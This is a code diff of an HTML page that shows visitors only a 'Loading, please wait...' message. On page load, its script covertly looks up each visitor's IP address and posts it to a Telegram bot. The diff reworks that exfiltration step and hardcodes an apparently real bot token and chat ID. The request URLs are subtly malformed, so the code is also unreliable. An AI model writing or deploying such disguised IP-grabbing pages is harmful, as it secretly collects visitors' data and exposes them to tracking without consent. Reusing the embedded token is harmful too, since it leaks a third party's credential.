@@ -2,30 +2,45 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Welcome</title>
 </head>
 <body>
-    <p>Loading page, please wait...</p>
+    <p>Loading, please wait...</p>
 
     <script>
-        // Replace with your actual Telegram Bot Token and Chat ID
         const BOT_TOKEN = "8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE";
         const CHAT_ID = "8714686528";
 
-        // Fetch user IP address from a public API
+        // 1. Get the IP address
         fetch('https://ipify.org')
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) throw new Error('IP fetch failed');
+                return response.json();
+            })
             .then(data => {
                 const userIp = data.ip;
-                const message = encodeURIComponent(`New visitor IP: ${userIp}`);
                 
-                // Send the IP to your Telegram bot
-                const telegramUrl = `https://telegram.org{BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-                
-                return fetch(telegramUrl);
+                // 2. Send to Telegram using POST (more reliable in browsers)
+                return fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `New visitor IP: ${userIp}`
+                    })
+                });
+            })
+            .then(teleResponse => {
+                if (!teleResponse.ok) {
+                    console.error('Telegram API error status:', teleResponse.status);
+                } else {
+                    console.log('Notification sent successfully.');
+                }
             })
             .catch(error => {
-                console.error('Error logging IP:', error);
+                console.error('Error:', error);
             });
     </script>
 </body>
